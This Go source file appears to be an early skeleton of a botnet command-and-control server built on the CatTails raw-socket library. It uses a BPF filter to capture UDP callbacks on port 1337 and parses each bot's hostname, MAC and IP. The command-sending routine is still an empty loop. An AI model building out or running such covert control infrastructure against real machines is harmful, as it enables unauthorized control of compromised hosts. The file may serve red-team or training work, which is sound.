package main

import (
	"fmt"
	"net"
	"strings"

	"github.com/google/gopacket"
	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/net/bpf"
	"golang.org/x/sys/unix"
)

// Host defines values for a callback from a bot
type Host struct {
	Hostname string
	Mac      net.HardwareAddr
	IP       net.IP
}

// sendCommand takes
func sendCommand(fd int, iface *net.Interface, src net.IP, listen chan string) {

	// Forever loop to respond to bots
	for {

	}
}

// ProcessPacket TODO:
func processPacket(packet gopacket.Packet, listen chan string) {

	data := string(packet.ApplicationLayer().Payload())

	payload := strings.Split(data, " ")

	// New Host struct for shipping info to sendCommand()
	newHost := Host{
		Hostname: payload[1],
		Mac:      net.HardwareAddr(payload[2]),
		IP:       net.ParseIP(payload[3]),
	}

	fmt.Println("My host:", newHost)
}

func main() {

	filterRaw := []bpf.RawInstruction{
		{0x28, 0, 0, 0x0000000c},
		{0x15, 0, 6, 0x000086dd},
		{0x30, 0, 0, 0x00000014},
		{0x15, 0, 15, 0x00000011},
		{0x28, 0, 0, 0x00000036},
		{0x15, 12, 0, 0x00000539},
		{0x28, 0, 0, 0x00000038},
		{0x15, 10, 11, 0x00000539},
		{0x15, 0, 10, 0x00000800},
		{0x30, 0, 0, 0x00000017},
		{0x15, 0, 8, 0x00000011},
		{0x28, 0, 0, 0x00000014},
		{0x45, 6, 0, 0x00001fff},
		{0xb1, 0, 0, 0x0000000e},
		{0x48, 0, 0, 0x0000000e},
		{0x15, 2, 0, 0x00000539},
		{0x48, 0, 0, 0x00000010},
		{0x15, 0, 1, 0x00000539},
		{0x6, 0, 0, 0x00040000},
		{0x6, 0, 0, 0x00000000},
	}

	vm := cattails.CreateBPFVM(filterRaw)

	readfd := cattails.NewSocket()
	sendfd := cattails.NewSocket()
	defer unix.Close(readfd)
	defer unix.Close(sendfd)

	// Make channel
	listen := make(chan string)

	// Iface and src ip for the sendcommand func to use
	iface, src := cattails.GetOutwardIface("8.8.8.8")

	// Spawn routine to listen for responses
	go sendCommand(sendfd, iface, src, listen)

	for {
		packet := cattails.ReadPacket(readfd, vm)
		// Yeet over to processing function
		if packet != nil {
			go processPacket(packet, listen)
		}
	}
}
